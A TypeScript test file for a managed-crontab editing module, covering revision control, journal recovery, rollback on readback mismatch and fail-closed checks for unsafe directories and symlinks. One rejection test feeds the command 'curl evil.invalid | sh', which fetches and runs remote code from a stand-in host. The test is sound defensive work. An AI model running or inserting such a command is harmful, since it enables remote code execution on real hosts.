import { afterEach, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  applyOwnerScheduleIntent,
  finalizeOwnerScheduleIntent,
  managedCronInventory,
  OwnerScheduleSafetyError,
  parseManagedCrontab,
  recordOwnerScheduleAudit,
  type CrontabAdapter,
  type ScheduleEditIntent,
} from "./owner-schedule-control.js";

const roots: string[] = [];
afterEach(() => { for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true }); });

function hash(value: string): string {
  return createHash("sha256").update(value).digest("hex");
}

function crontab(revision = 7, cron = "0 */6 * * *", enabled = true, commandTail = " /usr/bin/grok-news --latest"): string {
  const job = `${cron}${commandTail}`;
  return [
    "MAILTO=ops@example.invalid",
    `# ANET-MANAGED-SCHEDULE id=news-pull revision=${revision} command_sha256=${hash(commandTail)}`,
    enabled ? job : `# ANET-DISABLED ${job}`,
    "# ANET-MANAGED-SCHEDULE-END id=news-pull",
    "17 2 * * * /usr/bin/unmanaged-task",
    "",
  ].join("\n");
}

function fixture(initial = crontab()) {
  const root = mkdtempSync(join(tmpdir(), "anet-owner-schedule-"));
  roots.push(root);
  chmodSync(root, 0o700);
  const configPath = join(root, "config.json");
  writeFileSync(configPath, "{}\n", { mode: 0o600 });
  let current = initial;
  let installs = 0;
  const adapter: CrontabAdapter = {
    read: () => current,
    install: (value) => { installs += 1; current = value; },
  };
  return { root, configPath, adapter, current: () => current, installs: () => installs };
}

function intent(patch: Record<string, unknown> = { cron: "0 */12 * * *", enabled: false }): ScheduleEditIntent {
  return {
    intent_id: "sei_12345678-1234-1234-1234-123456789abc",
    node_id: "n_owner_schedule",
    schedule_id: "news-pull",
    base_revision: 7,
    patch,
  };
}

describe("owner schedule managed-cron control", () => {
  test("parses only exact managed markers and publishes bounded inventory", () => {
    const f = fixture();
    const parsed = parseManagedCrontab(f.current()).get("news-pull")!;
    expect(parsed).toMatchObject({ revision: 7, enabled: true, cron: "0 */6 * * *" });
    expect(parsed.commandTail).toBe(" /usr/bin/grok-news --latest");
    expect(managedCronInventory(f.adapter).get("news-pull")).toEqual({ cron: "0 */6 * * *", enabled: true, revision: 7 });
  });

  test("changes timing/enabled while preserving command and unmanaged bytes", () => {
    const f = fixture();
    const before = f.current();
    const result = applyOwnerScheduleIntent({ configPath: f.configPath, expectedNodeId: "n_owner_schedule", intent: intent(), adapter: f.adapter });
    expect(result).toMatchObject({ status: "applied", result_revision: 8 });
    expect(f.current()).toContain("# ANET-MANAGED-SCHEDULE id=news-pull revision=8");
    expect(f.current()).toContain("# ANET-DISABLED 0 */12 * * * /usr/bin/grok-news --latest");
    expect(f.current()).toContain("17 2 * * * /usr/bin/unmanaged-task");
    expect(f.current()).not.toBe(before);
    expect(existsSync(result.journalPath)).toBe(true);

    // Lost Hub ACK: the same intent is recovered from the journal and does
    // not install or increment a second time.
    const installs = f.installs();
    expect(applyOwnerScheduleIntent({ configPath: f.configPath, expectedNodeId: "n_owner_schedule", intent: intent(), adapter: f.adapter }).result_revision).toBe(8);
    expect(f.installs()).toBe(installs);
    finalizeOwnerScheduleIntent(f.configPath, intent().intent_id);
    expect(existsSync(result.journalPath)).toBe(false);
  });

  test("command replacement, wrong node, wrong revision, and unknown patch fail before install", () => {
    const commandTampered = crontab().replace("/usr/bin/grok-news", "/usr/bin/evil");
    for (const [initial, edit] of [
      [commandTampered, intent()],
      [crontab(), { ...intent(), node_id: "n_other" }],
      [crontab(), { ...intent(), base_revision: 6 }],
      [crontab(), intent({ command: "curl evil.invalid | sh" })],
    ] as const) {
      const f = fixture(initial);
      expect(() => applyOwnerScheduleIntent({ configPath: f.configPath, expectedNodeId: "n_owner_schedule", intent: edit as ScheduleEditIntent, adapter: f.adapter })).toThrow();
      expect(f.installs()).toBe(0);
      expect(f.current()).toBe(initial);
    }
  });

  test("install/readback failure restores and verifies the exact old crontab", () => {
    const f = fixture();
    const before = f.current();
    let calls = 0;
    const adapter: CrontabAdapter = {
      read: () => f.current(),
      install(value) {
        calls += 1;
        if (calls === 1) {
          f.adapter.install(`${value}# injected readback drift\n`);
        } else {
          f.adapter.install(value);
        }
      },
    };
    expect(() => applyOwnerScheduleIntent({ configPath: f.configPath, expectedNodeId: "n_owner_schedule", intent: intent(), adapter })).toThrow("readback mismatch");
    expect(calls).toBe(2);
    expect(f.current()).toBe(before);
  });

  test("unsafe node directory and symlink journal fail closed with zero host write", () => {
    const unsafe = fixture();
    chmodSync(unsafe.root, 0o755);
    expect(() => applyOwnerScheduleIntent({ configPath: unsafe.configPath, expectedNodeId: "n_owner_schedule", intent: intent(), adapter: unsafe.adapter })).toThrow("unsafe directory");
    expect(unsafe.installs()).toBe(0);

    const linked = fixture();
    const outside = join(linked.root, "outside");
    writeFileSync(outside, "{}\n", { mode: 0o600 });
    symlinkSync(outside, join(linked.root, ".external-schedule-edit-journal.json"));
    expect(() => applyOwnerScheduleIntent({ configPath: linked.configPath, expectedNodeId: "n_owner_schedule", intent: intent(), adapter: linked.adapter })).toThrow(OwnerScheduleSafetyError);
    expect(linked.installs()).toBe(0);
  });

  test("local audit is minimal, private and idempotent", () => {
    const f = fixture();
    const row = { intent_id: intent().intent_id, schedule_id: "news-pull", base_revision: 7, status: "applied" as const, result_revision: 8 };
    recordOwnerScheduleAudit(f.configPath, row);
    recordOwnerScheduleAudit(f.configPath, row);
    const raw = readFileSync(join(f.root, ".external-schedule-edit-audit.jsonl"), "utf8");
    expect(raw.trim().split("\n")).toHaveLength(1);
    expect(raw).not.toContain("grok-news");
    expect(raw).not.toContain("command");
    expect(raw).not.toContain("token");
  });
});
